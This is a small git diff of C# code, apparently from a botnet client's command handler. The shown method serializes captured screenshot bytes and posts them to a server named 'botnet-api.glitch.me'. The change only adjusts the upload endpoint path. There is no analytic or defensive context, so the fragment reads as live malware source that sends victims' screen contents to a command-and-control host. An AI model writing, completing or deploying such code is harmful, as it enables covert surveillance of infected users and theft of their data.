@@ -101,7 +101,7 @@ namespace CommandHandler
             client.BaseAddress = new Uri("http://botnet-api.glitch.me/");
             ScreenC screen = new ScreenC { id = Convert.ToUInt32(Id), bytes = bt };
             string json = new JavaScriptSerializer().Serialize(screen);
-            var resp = client.PostAsync($"/api/v1/screens/{Id}", new StringContent(json)).Result;
+            var resp = client.PostAsync($"/api/v1/screens", new StringContent(json)).Result;
             resp.EnsureSuccessStatusCode();
         }
         public static async Task IpDeleteAsync(string Id)
